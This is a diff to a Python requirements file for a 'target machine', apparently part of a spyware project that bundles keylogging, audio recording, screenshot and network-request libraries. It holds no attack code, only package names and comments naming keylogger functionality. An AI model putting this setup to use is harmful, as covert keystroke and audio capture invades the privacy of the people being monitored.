@@ -1,7 +1,10 @@
 # Requirements for TARGET MACHINE (Windows 7 32-bit with Python 3.8.10)
 
+# Windows-specific dependencies for full keylogger functionality
+pywin32
+
 # Cross-platform keylogger (Python 3.8 compatible)
-pynput>=1.7.3,<=1.7.6
+pynput>=1.7.3
 
 # Audio recording (Python 3.8 compatible) 
 PyAudio>=0.2.11
@@ -17,12 +20,3 @@ psutil>=5.8.0,<6.0.0
 
 # Network requests (Python 3.8 compatible)
 requests>=2.25.1,<3.0.0
-
-# Alternative keylogger library (easier installation)
-keyboard>=1.13.0
-
-# Alternative to some opencv functionality  
-mss>=6.1.0  # For screenshots without opencv dependency
-
-# Alternative to PyAutoGUI for some functionality
-pygetwindow>=0.0.9  # For window management
